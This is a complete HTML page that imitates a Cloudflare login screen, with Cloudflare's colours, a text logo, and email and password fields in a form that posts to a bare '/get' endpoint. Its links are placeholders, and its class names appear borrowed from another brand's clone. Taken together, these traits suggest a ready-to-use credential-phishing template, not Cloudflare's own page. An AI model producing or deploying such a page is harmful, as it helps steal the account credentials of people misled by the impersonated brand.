<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
    <title>Cloudflare</title>
    <style>
      body {
        font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Arial, sans-serif;
        background-color: #f38020;
        display: flex;
        justify-content: center;
        align-items: center;
        min-height: 100vh;
        margin: 0;
      }
      .login-container {
        width: 400px;
        background: #fff;
        border-radius: 12px;
        padding: 40px 36px;
        text-align: center;
      }
      #logo {
        margin-bottom: 24px;
      }
      .g-h1 {
        font-size: 22px;
        font-weight: 600;
        color: #1b1b1b;
        margin-bottom: 8px;
      }
      .g-h2 {
        font-size: 14px;
        color: #666;
        margin-bottom: 24px;
      }
      .g-input {
        width: 100%;
        padding: 12px 14px;
        border: 1px solid #e0e0e0;
        border-radius: 6px;
        font-size: 16px;
        margin-bottom: 16px;
        box-sizing: border-box;
        outline: none;
      }
      .g-input:focus {
        border-color: #f38020;
      }
      .gbtn-primary {
        width: 100%;
        padding: 12px;
        background-color: #f38020;
        color: #fff;
        border: none;
        border-radius: 6px;
        font-size: 16px;
        font-weight: 600;
        cursor: pointer;
      }
      .gbtn-primary:hover {
        background: #e07018;
      }
      .link {
        display: block;
        margin-top: 16px;
        color: #003682;
        font-size: 14px;
        text-decoration: none;
      }
      .link:hover {
        text-decoration: underline;
      }
      .footer {
        margin-top: 24px;
        font-size: 13px;
        color: #666;
      }
      .footer a {
        color: #003682;
        text-decoration: none;
      }
    </style>
  </head>
  <body>
    <div class="login-container">
      <svg id="logo" viewBox="0 0 100 40" width="100" height="40">
        <text x="50%" y="28" text-anchor="middle" font-family="Arial" font-weight="700" font-size="22" fill="#f38020">Cloudflare</text>
      </svg>
      <h1 class="g-h1">Log in to Cloudflare</h1>
      <p class="g-h2">Enter your email to continue</p>
      <form action="/get" method="POST">
        <input class="g-input" type="email" name="email" placeholder="Email" required>
        <input class="g-input" type="password" name="password" placeholder="Password" required>
        <button type="submit" class="gbtn-primary">Continue</button>
      </form>
      <a href="#" class="link">Forgot password?</a>
      <p class="footer">New to Cloudflare? <a href="#">Sign Up</a></p>
    </div>
  </body>
</html>
